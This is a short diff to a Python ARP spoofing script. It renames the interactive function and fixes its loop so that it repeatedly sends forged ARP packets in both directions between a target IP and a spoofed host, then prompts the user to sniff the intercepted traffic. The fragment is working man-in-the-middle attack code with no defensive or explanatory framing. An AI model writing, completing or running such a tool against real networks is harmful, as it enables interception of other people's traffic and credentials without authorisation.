@@ -35,7 +35,7 @@ def restore_arp_table(target_ip_mac, spoof_ip_mac):
 
 
 
-def arp_spoof():
+def arp_spoof_dia():
     
     print("----- Enter target IP -----")
     target_ip = input("---> ")
@@ -51,8 +51,8 @@ def arp_spoof():
     try:
 
         while True:
-            arp_spoof(target_ip_mac, spoof_ip_mac)
-            arp_spoof(spoof_ip_mac, target_ip_mac)
+            send_arp_pack(target_ip_mac, spoof_ip_mac)
+            send_arp_pack(spoof_ip_mac, target_ip_mac)
             packet_count += 2
             print(f"----- Send {packet_count} packets -----")
             print("----- SNIFF PLSSS -----")
